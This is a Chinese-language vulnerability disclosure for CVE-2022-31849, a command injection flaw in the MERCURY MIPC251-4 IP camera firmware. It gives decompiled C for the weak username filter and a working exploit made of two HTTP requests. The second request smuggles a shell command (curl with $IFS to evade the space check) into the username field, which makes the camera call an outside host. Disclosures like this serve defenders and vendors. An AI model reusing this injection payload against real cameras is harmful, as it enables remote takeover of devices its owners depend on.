# MERCURY MIPC251-4 存在命令注入漏洞

**漏洞厂商**: MERCURY

**厂商官网**: https://www.mercurycom.com.cn/

**影响产品**: MIPC251-4

**影响产品版本**: V2.0(20200608)

**固件链接**: https://service.mercurycom.com.cn/download/202007/MIPC251-4%20V2.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620200608_2.0.21.zip

**发现者**: [SkYe231](mailto:skye231@foxmail.com)@Hillstone

**CVE**:  CVE-2022-31849

## 漏洞描述

水星 MIPC251-4 存在远程命令执行，远程攻击者可以通过精心构造的数据包绕过限制，实现远程命令执行。

## 漏洞详情

以邮箱名作为 username 的核心过滤规则，规则仅对邮箱格式进行一些过滤（具体看代码注释），并没有对特殊符号进行过滤，存在注入的机会。

> file:/usr/bin/dsd

```c
/* 期待返回值1 */

int FUN_00024aa4(byte *param_1)

{
  size_t sVar1;
  char *pcVar2;
  int iVar3;
  
                    /* 账号为空 */
  if (param_1 == (byte *)0x0) {
    return 0;
  }
                    /* 长度为0 */
  sVar1 = strlen((char *)param_1);
  if (sVar1 == 0) {
    return 0;
  }
                    /* 限制长度<129 */
  if ((int)sVar1 < 129) {
                    /* 匹配出@ */
    pcVar2 = strchr((char *)param_1,L'@');
                    /* 没有匹配项 */
    if (pcVar2 == (char *)0x0) {
      return 0;
    }
                    /* 是否以@结尾 */
    if (param_1[sVar1 - 1] != 0x40) {
                    /* 是否以@开头 */
      iVar3 = *param_1 - 0x40;
      if (iVar3 != 0) {
        iVar3 = 1;
      }
      return iVar3;
    }
  }
  return 0;
}
```

## EXP

1. 登录后台获取 stok

    ```
    POST / HTTP/1.1
    Host: 192.168.0.103
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 73
    Origin: http://192.168.0.103
    Connection: close
    Referer: http://192.168.0.103/
    
    {"method":"do","login":{"username":"{your_name}","password":"{your_password}"}}
    ```

2. 发送云账号登录包，触发远程命令执行

    > 根据实际情况替换
    >
    > Stok:05173d0162e8c77387fa1bbc12b2fa62
    >
    > Command:`curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231'`
    
    ```
    POST /stok=05173d0162e8c77387fa1bbc12b2fa62/ds HTTP/1.1
    Host: 192.168.0.103
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 147
    Origin: http://192.168.0.103
    Connection: close
    Referer: http://192.168.0.103/
    
    {"cloud_config":{"bind":{"username":"\"}';curl$IFS-o-$IFS'http://192.168.0.101:9999/skye231';'{\"@mrskye.com","password":"admin123"}},"method":"do"}
    ```
    
    

